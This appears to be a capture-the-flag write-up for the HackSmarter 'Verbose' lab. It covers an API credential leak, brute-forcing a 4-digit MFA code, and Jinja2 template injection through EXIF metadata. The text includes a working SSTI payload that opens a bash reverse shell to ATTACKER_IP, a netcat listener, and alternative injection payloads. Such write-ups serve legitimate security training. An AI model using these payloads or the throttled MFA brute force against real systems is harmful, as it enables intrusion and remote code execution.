---
layout: default
title: "Verbose (SSTI) - Hacksmarter"
---
[← Back](./)

# Verbose (SSTI) - HackSmarter

## Overview
- **Platform:** HackSmarter
- **Vulnerabilities:** Information Disclosure, Weak MFA, SSTI
- **Framework:** Flask/Jinja2
- **Result:** Root shell (server running as root - poor configuration)
- **Flag:** `/root/root.txt`

---

## Attack Chain

### 1. User Registration
Created a normal user account on the application.

### 2. Information Disclosure - API Leaks Credentials
Discovered `/api/users/all` endpoint that exposed all user data including passwords:

```http
GET /api/users/all HTTP/1.1
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.12.3
Date: Fri, 23 Jan 2026 23:57:55 GMT
Content-Type: application/json
Content-Length: 572
Connection: close

[
{"email":"tony@hacksmarter.local","id":1,"mfa":null,"password":"basketball","role":"user","username":"tony"},
{"email":"johnny@hacksmarter.local","id":2,"mfa":null,"password":"dolphin","role":"user","username":"johnny"},
	{
		"email":"admin@hacksmarter.local",
		"id":3,
		"mfa":null,
		"password":"YouWontGetThisPasswordYouNoobLOL123",
		"role":"admin",
		"username":"admin"
	},
{"email":"student@hacksmarter.local","id":4,"mfa":null,"password":"liverpool","role":"user","username":"student"},
{"email":"test2@test.com","id":5,"mfa":null,"password":"password","role":"user","username":"haxor"}
]
```

Response revealed admin credentials among other users.

### 3. MFA Bypass via Brute Force
Attempted to login with admin credentials but account was protected by MFA (4-digit code).

**Approach:**
- Sent sample code `1234` to capture the request
- Moved to Burp Intruder to brute force all combinations `0001-9999`
- **Throttling required:** Server returned 500 errors under load
- **Solution:** 5 concurrent threads with random millisecond delay to vary traffic pattern
- Successfully brute forced the MFA code

### 4. Admin Panel Access
Once authenticated as admin, discovered two key functionalities:
1. **Logo Upload** - Upload new site logo (PNG only)
2. **User Permissions** - Upgrade any user's permissions

Gave original user account admin permissions as well.

### 5. SSTI Discovery
Found logo preview endpoint:
```
/admin/logo_preview?file=logo.png
```

The preview page displayed EXIF metadata - specifically the **Copyright / Artist** field.

**SSTI Test:**
```bash
convert -size 1x1 xc:white /tmp/test.png
exiftool -Artist='{{7*7}}' /tmp/test.png
```

Uploaded and previewed - **"49" appeared** in the Artist field, confirming Jinja2 SSTI.

### 6. RCE via Jinja2 SSTI Payload
**Listener setup:**
```bash
# Start listener
nc -lvnp 4444
```

**Payload creation:**
```bash
convert -size 1x1 xc:white /tmp/shell.png
exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"").read()}}' /tmp/shell.png
```

Uploaded, triggered preview, received root shell.

### 7. Flag Capture
```bash
cat /root/root.txt
```

---

## Payload Breakdown

The SSTI payload:
```
{{lipsum.__globals__.os.popen("COMMAND").read()}}
```

| Component | Purpose |
|-----------|---------|
| `{{ }}` | Jinja2 expression tags - evaluates and outputs result |
| `lipsum` | Built-in Jinja2 function (lorem ipsum generator) |
| `.__globals__` | Access Python's global namespace from function object |
| `.os` | The `os` module available in globals |
| `.popen("cmd")` | Execute shell command |
| `.read()` | Trigger execution and return output |

**Why lipsum?**
- It's a Python function object with `__globals__` attribute
- Often not filtered (unlike `config`, `request`, `self`)
- Provides access to imported modules like `os`

---

## Alternative Payloads

```bash
# Using cycler
exiftool -Artist='{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}' /tmp/shell.png

# Using joiner
exiftool -Artist='{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen("id").read()}}' /tmp/shell.png
```

---

## Key Takeaways

1. **Always check API endpoints** - `/api/users/all` exposed sensitive data including passwords
2. **Weak MFA is no MFA** - 4-digit codes are brute-forceable in reasonable time
3. **Throttle your attacks** - Adjust threads/delays to avoid crashing the target or triggering rate limits
4. **EXIF metadata in templates = potential SSTI** - When file uploads display metadata, test all fields for injection
5. **Test the correct field** - Comment field didn't work; Artist/Copyright was the injection point
6. **Poor server config** - Application running as root gave immediate root access (no privesc needed)

---

## Resources

- **PayloadsAllTheThings - SSTI:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- **HackTricks - SSTI:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/

---

## Tools Used

- **Burp Suite Intruder** - MFA brute force with throttling
- **exiftool** - EXIF metadata manipulation
- **convert** (ImageMagick) - Create minimal PNG files
- **nc** (netcat) - Reverse shell listener
